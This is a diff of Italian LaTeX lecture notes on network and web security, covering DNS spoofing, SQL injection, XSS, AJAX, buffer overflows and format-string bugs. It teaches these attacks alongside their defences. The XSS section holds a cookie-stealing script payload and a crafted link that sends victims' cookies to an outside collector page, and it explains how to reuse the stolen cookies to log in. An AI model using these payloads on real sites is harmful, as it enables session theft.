@@ -148,7 +148,7 @@ Lo scopo dell'attaccante è quindi quello di riuscire ad \textit{inquinare la ca
 	\item ID del pacchetto $\longrightarrow$ quello del pacchetto di richiesta (non prevedibile)
 \end{itemize}
 Ci sono quindi due campi, entrambi di 16 bit (porta e ID) che potrebbero essere non prevedibili dall'attaccante. Abbiamo dunque 32 bit incogniti che si traducono in $2^{32} \simeq 4$ miliardi di possibili combinazioni, ossia di pacchetti. L'attaccante, ammesso che sappia il momento in cui deve inviare la risposta fasulla, deve inviare prima del server remoto mediamente 2 miliardi di pacchetti; se ogni pacchetto è lungo 80 byte, l'attaccante deve inviare 160 GB di traffico prima che il server remoto possa rispondere. L'attacco quindi non sembrerebbe possibile.\\
-Devono però essere fatte delle osservazioni sulle ipotesi formulate sinora. Alcuni server DNS non utilizzano una porta casuale per inviare le richieste: il bind sceglie una porta all'avvio e continua ad usarla anche in seguito. Dunque, una volta scoperta la porta, i bit incogniti sono 16, ossia passiamo da $2^{32}$ a $2^{16}$ possibili combinazioni, che sono comunque 65000 $\cdot$ 80 $\simeq 5$ MB da inviare in poche decine di millisecondi.\\
+Devono però essere fatte delle osservazioni sulle ipotesi formulate sinora. Alcuni server DNS non utilizzano una porta casuale per inviare le richieste: il bind sceglie una porta all'avvio e continua ad usarla anche in seguito. Dunque, una volta scoperta la porta, i bit incogniti sono 16, ossia passiamo da $2^{32}$ a $2^{16}$ possibili combinazioni, che sono comunque 65000 $\cdot$ 80 $\simeq 5$ MB da inviare in poche decine di millisecondi. Questoè  tipo di attacco possibile grazie al \textit{paradosso del compleanno}.\\
 Immaginiamo inoltre che l'attaccante (Eve) possa far iniziare la richiesta al server DNS (o è all'interno della rete, oppure il server DNS (Alice) accetta anche richieste dall'esterno). A questo punto l'attaccante sa quando avverrà la richiesta:
 \begin{itemize}
 	\item Eve invia ad Alice una richiesta per il dominio \url{www.example.com}
@@ -237,7 +237,7 @@ Lo script in PHP che esegue fa il parsing degli input è il seguente:
 	echo $user."\' Secret is: ". $row['secret']. "\n";
 ?>
 \end{lstlisting}
-Una prima cosa che si osserva è che i parametri vengono passati attraverso GET: è buona norma utilizzarla quando non deve essere variato lo stato delle risorse, si usa invece POST nel caso opposto. La query viene fatta al database MySQL \texttt{userdb} avente questa forma:
+Una prima cosa che si osserva è che i parametri vengono passati attraverso GET: è buona norma utilizzarla quando non deve essere variato lo stato delle risorse, si usa invece POST nel caso opposto. Inoltre con il metodo GET le informazioni vengono passate direttamente al server come parte dell'Url, e quindi in chiaro (mai usare il gett quando si devono inviare password!). La query viene fatta al database MySQL \texttt{userdb} avente questa forma:
 \begin{figure}[htbp]
 	\centering
 	\begin{tabular}{|c|c|c|}
@@ -310,10 +310,17 @@ $statement = $db_connection->prepare("
 $statement->bind_param("i", $id);
 $statement->execute();
 \end{lstlisting}
-Si noti che il problema delle injection non si verifica solo con PHP+MySQL, ma con qualsiasi altro linguaggio di interfaccia verso un qualsiasi altro database: ASP, Python, Ruby, Postgres, Oracle, $\dots$
+Altri tipi di prevenzione possono essere quelli di limitare i permessi per accedere al database e la conversione esadecimale del testo prima di usarlo in un comando SQL. Si noti che il problema delle injection non si verifica solo con PHP+MySQL, ma con qualsiasi altro linguaggio di interfaccia verso un qualsiasi altro database: Ajax, ASP, Python, Ruby, Postgres, Oracle, $\dots$
+
+\begin{figure}[htbp]
+	\centering
+	\includegraphics[scale = 0.5]{images/exploits_of_a_mom}
+	\label{img:xkcd}
+\end{figure}
+
 
 \subsubsection{Cross-Site-Scripting (XSS)}
-Un XSS è un attacco basato sulla possibilità di inserire del codice malizioso in pagine web esterne ritenute affidabili dagli utenti, in modo che questi, quando si collegano a tali pagine, vengano indotti ad eseguirlo. L'attacco può essere \textit{stored}, cioè il codice persiste stabilmente nella pagina web (è la variante più devastante di XSS), o \textit{reflected}, cioè il codice viene usato immediatamente dallo script lato server per costruire le pagine risultanti. Si consideri, a scopo illustrativo, un semplice form in HTML come il seguente:
+Un XSS è un attacco basato sulla possibilità di inserire del codice malizioso in pagine web esterne ritenute affidabili dagli utenti, in modo che questi, quando si collegano a tali pagine, vengano indotti ad eseguirlo. L'attacco può essere \textit{stored}, cioè il codice persiste stabilmente nella pagina web (è la variante più devastante di XSS perchè i dati forniti dall'attaccante vengono salvati sul server, e quindi visualizzati in modo permanente sulle pagine normalmente fornite agli utenti durante la navigazione), o \textit{reflected}, cioè il codice viene usato immediatamente dallo script lato server per costruire le pagine risultanti. Si consideri, a scopo illustrativo, un semplice form in HTML come il seguente:
 \begin{lstlisting}[language=html]
 <html>
 	<form action="check.php" method="get">
@@ -330,7 +337,9 @@ Lo script PHP a cui il form invia i dati è del tipo:
 	echo "Hai scritto: ".$input;
 ?>
 \end{lstlisting}
-Se provassimo ad inserire del codice HTML (e.g. \texttt{<h1> prova </h1>}) nel form, questo viene interpretato dal browser come codice da eseguire e non come semplice testo. Se, invece, dentro al form provassimo ad inserire del codice Javascript (e.g. \texttt{<script> alert("Hello World!"); </script>}), succederebbe che il browser scaricherebbe la pagina web con il codice Javascript e lo eseguirebbe in locale. In questo caso l'unica conseguenza è l'apertura di una finestra nel browser dell'utente, ma complicando le cose potremmo avere attacchi molto più complessi.
+Supponiamo di avere un motore di ricerca, che, all’invio dei dati di ricerca, rimanda alla pagina \texttt{search.php}. In questo caso, l’utente ha inserito nel campo di ricerca la parola \textit{"cantante"}, quindi viene reindirizzato alla pagina \texttt{search.php?query=cantante}. Essendo una richiesta di tipo GET, se proviamo ad inserire del codice HTML nella URL (e.g. \texttt{<h1> prova </h1>}) nel form, questo viene interpretato dal browser come codice da eseguire e non come semplice testo. Se, invece, dentro al form provassimo ad inserire del codice Javascript (e.g. \texttt{<script> alert("Hello World!"); </script>}), succederebbe che il browser scaricherebbe la pagina web con il codice Javascript e lo eseguirebbe in locale (l'indirizzo sarebbe \texttt{search.php?query=<script>alert("Hello World!");</script>}. In questo caso l'unica conseguenza è l'apertura di una finestra nel browser dell'utente, ma complicando le cose potremmo avere attacchi molto più complessi.\\
+
+L’esempio precendente fa semplicemente mostrare un popup nel sito web, ovviamente puo’ bastare per essere mostrato all’amministratore del sito in modo da invitarlo a correggere lo script, ma adesso andremo a mostrare il codice malevolo utilizzato per prelevare cookies di altri utenti del sito: \texttt{<script>document.location = “http://www.google.it”;</script>}. Con questo codice si puo’ letteralmente dirottare il sito affetto dalla vulnerabilità sul sito di Google. Ovviamente anche questo e’ inutile, ma pian piano ci stiamo avvicinando al risultato.
 
 HTML non ha uno stato relativo alla sessione, ogni connessione non è correlata alla precedente. Per evitare di reinserire utente e password ad ogni azione, si utilizzano i \textit{cookies}. Un cookie è un'informazione che il server invia al browser dopo il primo login ed il browser automaticamente reinvia al server ad ogni azione. In questo modo il server riconosce il browser e gli permette di saltare le autenticazioni per il tempo di validità del cookie. Vediamo adesso un esempio più completo; nella prima pagina mettiamo un codice banale per effettuare un login:
 \begin{lstlisting}[language=html]
@@ -377,18 +386,18 @@ Il codice di echo è il seguente:
 		echo "non hai diritto ad accedere a questa pagina\n"
 ?>
 \end{lstlisting}
-Se adesso provassimo ad inserire il codice Javascript di prima, troveremmo un cookie con un valore. Se inserissimo però \texttt{{\footnotesize<script> window.open('http://google.it?cookie='+document.cookie) </script>}} succederebbe che il browser invierebbe al sito il contenuto del cookie.
+Se adesso provassimo ad inserire il codice Javascript di prima, troveremmo un cookie con un valore. Se inserissimo però:\\
+ \texttt{<script>document.location = “http://www.tuosito.com/cookies.php?a=”+document.cookie;</script>} 
+ succederebbe che il browser invierebbe al sito il contenuto del cookie. Con questo si dirotta il sito verso http://www.tuosito.com/cookies.php e si passano tramite la variabile \texttt{a} tutti i cookies che ha l’utente che e’ andato su quella pagina. In sostanza passando il link \texttt{search.php?query=<script>document.location = “http://www.tuosito.com/cookies.php?a=”+document.cookie;</script>} ad un qualsiasi utente di quel sito si mandano i suoi cookies su una nostra pagina, ma questi cookies che la nostra pagina riceve devono essere salvati da qualche parte per essere poi letti.\\
 
-Vediamo più nel concreto dove può essere applicato questo genere di attacco. Immaginiamo un sito nel quale è possibile lasciare commenti. Il sito non fa la validazione degli input, quindi permette agli utenti di aggiungere codice Javascript alla pagina. Un attaccante potrebbe pensare quindi di aggiungere un codice come quello precedente, e tutte le persone che dopo di lui caricano la pagina lo eseguirebbero. Se quelle persone hanno dei cookie, i cookie verrebbero rediretti verso un sito controllato dall'attaccante: l'attaccante a quel punto può usarli per accedere a dei servizi con l'identità degli utenti vittime. A scopo informativo, di seguito sono riportati alcuni attacchi XSS effettuati negli scorsi anni:
-\begin{itemize}
-	\item Ottobre 2007. XSS in Sutra's Airkiosk: un software che gestisce le prenotazioni online di molte compagnie aeree low-cost. Sul sito gli utenti immettono i propri dati ed i numeri di carta di credito.
-	\item Gennaio 2008. XSS nel sito di Banca Fideuram Online: un XSS permetteva all'attaccante di aprire pagine che provenivano dal sito della banca, sotto HTTPS, ma che redirigevano le informazioni all'esterno.
-\end{itemize}
-La stessa cosa può accadere utilizzando: link HTML dentro al corpo delle e-mail ed errori prodotti da web server mal configurati (e.g. 404).
+Vediamo più nel concreto dove può essere applicato questo genere di attacco. Immaginiamo un forum nel quale è possibile lasciare commenti. Il sito non fa la validazione degli input, quindi permette agli utenti di aggiungere codice Javascript alla pagina. Un attaccante potrebbe pensare quindi di aggiungere un codice come quello precedente, e tutte le persone che dopo di lui caricano la pagina lo eseguirebbero. Se quelle persone hanno dei cookie, i cookie verrebbero rediretti verso un sito controllato dall'attaccante: l'attaccante a quel punto può usarli per accedere a dei servizi con l'identità degli utenti vittime. La pericolosita’ della XSS e’ direttamente proporzionale alla privatezza dei cookies. Molti script salvano all’interno dei cookies dati importanti quali hash di password, quindi si puo’ benissimo arrivare a trovare la password di qualche utente. Anche i forum salvano quasti dati, quindi la vulnerabilita’ si fa pericolosa specialmente con un forum installato. Pur non conoscendo il valore dell’hash, si possono benissimo copiare i cookies “rubati” all’interno del browser, e quindi entrare tranquillamente con l’username.
+
+Alcuni modi per difendersi dall'XSS sono: controlli sulla variabile GET, disabilitare gli script, input validation, legare il cookie di sessione all'indirizzo IP dell'utente che ha ottenuto l'accesso in origine, settare il cookie come \texttt{HttpOnly} in modo da non essere eseguito dal JavaScript e Content Security Policy.
+
+\textbf{\textit{Oss.}} La stessa cosa può accadere utilizzando: link HTML dentro al corpo delle e-mail ed errori prodotti da web server mal configurati (e.g. 404).
 
 \subsection{Attacchi ai protocolli superiori}
-Introduciamo anzitutto una nota tecnica di sviluppo: \textbf{AJAX} (Asynchronous JavaScript and XML). È un paradigma per la programmazione online che lega Javascript e XML con un qualsiasi linguaggio di backend per produrre interazione \textit{asincrona} tra client e server. Il termine \textquotedblleft interazione asincrona" significa che la pagina reagisce in tempo reale alle azioni dell'utente senza il bisogno di ricaricare completamente la pagina. Gmail e facebook sono esempi di applicazioni scritte in AJAX. Nella pratica AJAX non è una nuova tecnologia ma una composizione di
-tecnologie esistenti aventi gli stessi problemi, ma con una più complessa gestione della sicurezza. AJAX è un modello di programmazione molto complesso, vedremo dunque solo alcune linee guida relative alla sicurezza. In Figura \ref{img:ajax-model} è riportata la differenza tra modello classico ed il modello di AJAX; in pratica la parte di autenticazione e richiesta-risposta al server è gestita interamente da AJAX. Questa non è assolutamente una buona idea, poiché sorge il problema \textquotedblleft chi si autentica con chi" ed inoltre un eventuale bug nell'AJAX engine rappresenterebbe una vulnerabilità del sistema utilizzabile da un attaccante.
+Introduciamo anzitutto una nota tecnica di sviluppo: \textbf{AJAX} (Asynchronous JavaScript and XML). È un paradigma per la programmazione online che lega Javascript e XML con un qualsiasi linguaggio di backend per produrre interazione \textit{asincrona} tra client e server. Il termine \textquotedblleft interazione asincrona" significa che la pagina reagisce in tempo reale alle azioni dell'utente senza il bisogno di ricaricare completamente la pagina. Gmail e Facebook sono esempi di applicazioni scritte in AJAX. Nella pratica AJAX non è una nuova tecnologia ma una composizione di tecnologie esistenti aventi gli stessi problemi, ma con una più complessa gestione della sicurezza. AJAX è un modello di programmazione molto complesso, vedremo dunque solo alcune linee guida relative alla sicurezza. In Figura \ref{img:ajax-model} è riportata la differenza tra modello classico ed il modello di AJAX; in pratica la parte di autenticazione e richiesta-risposta al server è gestita interamente da AJAX. Questa non è assolutamente una buona idea, poiché sorge il problema \textquotedblleft chi si autentica con chi" ed inoltre un eventuale bug nell'AJAX engine rappresenterebbe una vulnerabilità del sistema utilizzabile da un attaccante.
 \begin{figure}[htbp]
 	\centering
 	\includegraphics[scale = 0.35]{images/ajax-model}
@@ -397,17 +406,16 @@ tecnologie esistenti aventi gli stessi problemi, ma con una più complessa gesti
 \end{figure}\\
 Vediamo tre pericoli a cui è esposto AJAX:
 \begin{enumerate}
-	\item \textbf{Controlli client-side}. Un controllo di sicurezza deve essere effettuato server-side e non client-side. Quando si deve controllare la validità di una password ad esempio, ci si deve ricordare che l'applicazione client-side è
-	sempre manipolabile dall'utente. La tendenza a demandare azioni all'applicazione cliente su AJAX porta a compiere errori di questo tipo.
+	\item \textbf{Controlli client-side}. Un controllo di sicurezza deve essere effettuato server-side e non client-side. Quando si deve controllare la validità di una password ad esempio, ci si deve ricordare che l'applicazione client-side è sempre manipolabile dall'utente. La tendenza a demandare azioni all'applicazione cliente su AJAX porta a compiere errori di questo tipo.
 	\item \textbf{Cache client-side}. AJAX salva in cache locale molti dati relativi alla sessione; è necessario dunque porre un'attenzione particolare verso altri programmi che possono manipolare questi dati.
-	\item \textbf{Mashups}. Il web 2.0 è fatto di integrazione di contenuti prodotti dagli utenti e da altre sorgenti aggregate nella stessa pagina. Un aggregatore di servizi mette insieme oggetti che provengono da indirizzi IP e domini diversi. È quindi molto difficile tracciare tutte le sorgenti che contribuiscono ad una stessa pagina e filtrarle in modo che non vi caschino anche applicazioni non previste (vedi XSS).
+	\item \textbf{Mashups}. Il web 2.0 è fatto di integrazione di contenuti prodotti dagli utenti e da altre sorgenti aggregate nella stessa pagina. Un aggregatore di servizi mette insieme oggetti che provengono da indirizzi IP e domini diversi. È quindi molto difficile tracciare tutte le sorgenti che contribuiscono ad una stessa pagina e filtrarle in modo che non vi caschino anche applicazioni non previste (vedi XSS, SQL Injection, Vulnerabilità \textit{XMLHttpRequest}).
 \end{enumerate}
-Per rendere sicuro AJAX, dunque, i controlli dovrebbero essere effettuati server-side e la cache di AJAX dovrebbe essere in qualche modo protetta per evitare che l'attaccante recuperi in qualche modo i dati sensibili al suo interno. Si noti che i dati nella cache vengono trasferiti prima di qualsiasi richiesta da parte dell'utente.
+Per rendere sicuro AJAX, dunque, i controlli dovrebbero essere effettuati server-side e la cache di AJAX dovrebbe essere in qualche modo protetta per evitare che l'attaccante recuperi in qualche modo i dati sensibili al suo interno. Si noti che i dati nella cache vengono trasferiti prima di qualsiasi richiesta da parte dell'utente.\\
 
 \noindent Vediamo di seguito gli attacchi alle applicazioni.
 
 \subsubsection{Buffer overflow}
-Il buffer overflow è una vulnerabilità in un programma che permette ad un attaccante di far eseguire del codice arbitrario all'applicazione vulnerabile; nel peggiore dei casi è svolto da remoto. Lo scopo è quello di riuscire ad eseguire dei comandi che altrimenti l'attaccante non potrebbe eseguire sulla macchina remota. I buffer overflow sono causati da errori di programmazione di chi scrive i programmi e sono di gran lunga la causa più frequente di intrusioni. Consideriamo un programma in linguaggio C come questo:
+Il buffer overflow è una vulnerabilità in un programma che permette ad un attaccante di far eseguire del codice arbitrario all'applicazione vulnerabile; nel peggiore dei casi è svolto da remoto. Lo scopo è quello di riuscire ad eseguire dei comandi che altrimenti l'attaccante non potrebbe eseguire sulla macchina remota. I buffer overflow sono causati da errori di programmazione di chi scrive i programmi e sono di gran lunga la causa più frequente di intrusioni. Possono essere principalmente di due tipi: \textit{stack-based}, spazio di memoria associato alle funzioni e alle variabili del mio programma, oppure \textit{heap-based}, memoria dinamica virtuale usata per allocare variabili che non conosciamo la dimensione a runtime. Consideriamo il caso \textit{stack-based} e un programma in linguaggio C come questo:
 \begin{lstlisting}[language=C]
 #include <stdio.h>
 #include <string.h>
@@ -452,7 +460,7 @@ Nel codice sorgente non si controlla che la variabile \texttt{parola} sia lunga 
 Per proteggersi dai buffer overflow è necessario controllare \textit{sempre} l'input che arriva dall'esterno (input da utente, input da file, variabili d'ambiente) ed utilizzare funzioni che limitano la lunghezza della scrittura (non usare dunque \texttt{strcpy(dest, source)}, ma \texttt{strncpy(dest, source, len)}). Linux rimedia a questo attacco offrendo la possibilità di rendere lo stack non eseguibile ed esistono inoltre dei compilatori/debugger per individuare i buffer overflow. Le buone pratiche che ogni programmatore dovrebbe considerare sono: protezione dai buffer overflow, uso di files temporanei, evitare race condition e la chiamata \texttt{system()} (quest'ultima può avere effetti devastanti per il sistema operativo).
 
 \subsubsection{Format bug}
-Un format bug è un attacco che si basa su un errore di programmazione molto comune che ha sempre a che vedere con la gestione delle stringhe. Un codice di esempio:
+Un format bug, o \textit{format string attack}, è un attacco che si basa su un errore di programmazione molto comune che ha sempre a che vedere con la gestione delle stringhe. Un codice di esempio:
 \begin{lstlisting}[language=C]
 #include <stdio.h>
 #include <string.h>
@@ -468,6 +476,7 @@ int main(int argc, char** argv) {
 }
 \end{lstlisting}
 Il format bug in questo caso è contenuto nella funzione \texttt{int printf(const char* format, ...);} che prende in ingresso una sequenza di puntatori a char ed il primo parametro è il formato. Nel formato generalmente è scritto quanti e quali sono i parametri che seguono, ad esempio \texttt{printf("\%s","Hello World");} La funzione \texttt{printf()} legge la stringa di formato, trova i simboli speciali che iniziano per \texttt{\%}, conta quanti e quali parametri seguono, li legge dallo stack, li sostituisce ai caratteri speciali e poi stampa la stringa di formato. Se si lascia all’utente la possibilità di scrivere nella stringa di formato (invece che riempire i buchi usando gli speciali \texttt{\%}) si va incontro a problemi seri. Vediamo quali sono.\\
+
 Se l'utente digita come input una stringa come \texttt{\%x\%x}, funzione \texttt{printf()} cerca nello stack due valori e li stampa come esadecimali. Nello stack, ad eccezione delle informazioni che vengono messe implicitamente nel corso del programma, non vi è nulla che riguardi la \texttt{printf()} stessa. Per metterci qualcosa basta digitare in input una stringa del tipo \texttt{aaaa \%x\%x}. Così facendo, viene fatto il \textit{pop} dallo stack, nel momento in cui viene eseguita la \texttt{printf()}, di tutti i parametri che vengono passati, quindi non è possibile apparentemente interferire con lo stack. Esistono tuttavia dei valori di formato particolarmente esoterici:
 \begin{itemize}
 	\item \texttt{\%.XXX}: il punto specifica il padding con cui scrivo l'argomento successivo, come in
